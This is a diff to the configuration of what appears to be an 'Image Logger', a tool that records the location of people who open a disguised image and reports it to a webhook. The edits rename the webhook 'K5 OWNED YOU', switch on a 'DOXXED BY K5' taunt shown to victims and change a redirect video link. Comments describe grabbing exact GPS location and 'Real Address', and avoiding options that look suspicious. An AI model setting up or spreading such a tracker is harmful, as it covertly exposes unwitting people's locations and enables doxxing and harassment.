@@ -16,7 +16,7 @@ config = {
 
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "K5 OWNED YOU", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -25,7 +25,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "DOXXED BY K5 LOL SKID LZZZZZZZZZZ", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
@@ -49,7 +49,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://res.cloudinary.com/diff4jfud/video/upload/v1760713666/Screen_Recording_2025-10-17_155830_sbevmf.mp4" # Link to the webpage to redirect to 
+        "page": "https://res.cloudinary.com/diff4jfud/video/upload/v1760810554/Screen_Recording_2025-10-18_190147_mafeqp.mp4" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
